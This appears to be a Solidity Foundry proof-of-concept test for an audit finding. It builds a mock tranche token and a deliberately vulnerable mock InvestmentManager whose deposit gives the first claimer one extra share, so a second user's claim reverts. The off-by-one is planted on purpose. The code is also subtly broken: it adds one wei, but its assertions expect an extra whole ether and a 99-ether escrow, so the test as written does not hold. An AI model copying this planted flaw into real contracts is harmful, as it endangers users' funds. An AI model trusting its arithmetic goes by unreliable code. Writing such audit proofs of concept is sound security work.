// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import {LiquidityPool} from "src/LiquidityPool.sol";

// ------------------------------------------------------------
// Minimal interfaces copied here to keep PoC self-contained
// ------------------------------------------------------------
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 amount);
}

interface TrancheTokenLike is IERC20 {
    function checkTransferRestriction(address from, address to, uint256 value) external view returns (bool);
}

// ------------------------------------------------------------
// Mock tranche token with minimal ERC-20 behaviour
// ------------------------------------------------------------
contract MockTrancheToken is TrancheTokenLike {
    string public name = "Mock Tranche";
    string public symbol = "MTR";
    uint8  public decimals = 18;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to]        += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(balanceOf[from] >= amount && allowed >= amount, "ERC20: bad");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from]            -= amount;
        balanceOf[to]              += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    // mint helper for tests
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply   += amount;
        emit Transfer(address(0), to, amount);
    }

    // Escrow transfer restrictions are not enforced in the mock
    function checkTransferRestriction(address, address, uint256) external pure override returns (bool) {
        return true;
    }
}

// ------------------------------------------------------------
// Vulnerable InvestmentManager mock reproducing rounding issue
// ------------------------------------------------------------
interface InvestmentManagerLike {
    function processDeposit(address receiver, uint256 assets) external returns (uint256);
    function setMaxDeposit(address user, address lp, uint256 assets) external;
}

contract MockInvestmentManager is InvestmentManagerLike {
    struct Order {
        uint256 maxDeposit; // claimable asset amount
    }

    // user => liquidityPool => order
    mapping(address => mapping(address => Order)) public orderbook;
    MockTrancheToken public immutable trancheToken;

    constructor(MockTrancheToken _t) {
        trancheToken = _t;
    }

    // helper used by the test to seed claimable amounts
    function setMaxDeposit(address user, address lp, uint256 assets) external override {
        orderbook[user][lp].maxDeposit = assets;
    }

    // -------- Vulnerable logic --------
    // NOTE: mimics the real signature but simplifies inner workings.
    function processDeposit(address receiver, uint256 assets) external override returns (uint256 shares) {
        address lp = msg.sender;

        require(assets != 0 && assets <= orderbook[receiver][lp].maxDeposit,
            "InvestmentManager/amount-exceeds-deposit-limits");

        // Vulnerable price calculation – always returns 1 * 10**18
        uint256 depositPrice = 1e18;
        require(depositPrice != 0, "LiquidityPool/deposit-token-price-0");

        // VULN: rounding error gives the claimer *one extra* share
        shares = assets + 1; // <-- the fatal off-by-one

        // update book first
        orderbook[receiver][lp].maxDeposit -= assets;

        // attempt to send the shares
        require(trancheToken.transfer(receiver, shares), "tranche transfer failed");
    }

    // --- Unused interface functions (stubs) ---
    function processMint(address, uint256) external pure returns (uint256)                   { revert(); }
    function processWithdraw(uint256, address, address) external pure returns (uint256)      { revert(); }
    function processRedeem(uint256, address, address) external pure returns (uint256)        { revert(); }
    function maxDeposit(address, address) external pure returns (uint256)                    { return 0; }
    function maxMint(address, address) external pure returns (uint256)                       { return 0; }
    function maxWithdraw(address, address) external pure returns (uint256)                   { return 0; }
    function maxRedeem(address, address) external pure returns (uint256)                     { return 0; }
    function totalAssets(uint256, address) external pure returns (uint256)                   { return 0; }
    function convertToShares(uint256, address) external pure returns (uint256)               { return 0; }
    function convertToAssets(uint256, address) external pure returns (uint256)               { return 0; }
    function previewDeposit(address, address, uint256) external pure returns (uint256)       { return 0; }
    function previewMint(address, address, uint256) external pure returns (uint256)          { return 0; }
    function previewWithdraw(address, address, uint256) external pure returns (uint256)      { return 0; }
    function previewRedeem(address, address, uint256) external pure returns (uint256)        { return 0; }
    function requestRedeem(uint256, address) external pure                                  { revert(); }
    function requestDeposit(uint256, address) external pure                                 { revert(); }
    function collectDeposit(address) external pure                                          { revert(); }
    function collectRedeem(address) external pure                                           { revert(); }
    function decreaseDepositRequest(uint256, address) external pure                         { revert(); }
    function decreaseRedeemRequest(uint256, address) external pure                          { revert(); }
}

// ------------------------------------------------------------
// Exploit test
// ------------------------------------------------------------
contract LiquidityPoolExploitTest is Test {
    MockTrancheToken            tranche;
    MockInvestmentManager       manager;
    LiquidityPool               lp;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);

    function setUp() public {
        // create mock tranche token & investment manager
        tranche  = new MockTrancheToken();
        manager  = new MockInvestmentManager(tranche);

        // create the LiquidityPool. 'asset' field is unused in this PoC, pass address(0)
        lp = new LiquidityPool(
            uint64(1),           // poolId
            bytes16("TRANCHE_ID"),
            address(0),          // asset (currency) – not needed
            address(tranche),    // share token
            address(manager)     // investment manager
        );

        // Give the InvestmentManager some tranche shares produced by two executed deposits
        // Alice: 100 assets -> 100 shares
        // Bob  : 100 assets -> 100 shares
        tranche.mint(address(manager), 200 ether);                 // use 18 decimals
        manager.setMaxDeposit(alice, address(lp), 100 ether);
        manager.setMaxDeposit(bob,   address(lp), 100 ether);
    }

    // ------------------------------------------------------------
    // Demonstrates that Alice can drain one extra share, blocking Bob
    // ------------------------------------------------------------
    function testExploit_OverClaimsShares() public {
        // Alice claims her deposit first
        vm.startPrank(alice);
        uint256 aliceShares = lp.deposit(100 ether, alice);        // should transfer 101 shares (off-by-one)
        vm.stopPrank();

        assertEq(aliceShares, 100 ether + 1 ether, "Alice got unexpected share amount");
        assertEq(tranche.balanceOf(alice), 101 ether, "Alice balance mismatch");

        // Remaining shares in escrow should be only 99
        assertEq(tranche.balanceOf(address(manager)), 99 ether, "Escrow share balance wrong");

        // Bob now tries to claim his FULL 100 asset deposit
        vm.startPrank(bob);
        vm.expectRevert("ERC20: insufficient");
        lp.deposit(100 ether, bob);                                // reverts because escrow lacks 100 + 1 shares
        vm.stopPrank();

        // Bob received nothing
        assertEq(tranche.balanceOf(bob), 0, "Bob should have 0 shares");

        // Vulnerability proven: first claimer received more shares than minted,
        // leaving the escrow under-collateralised and blocking subsequent users.
    }
}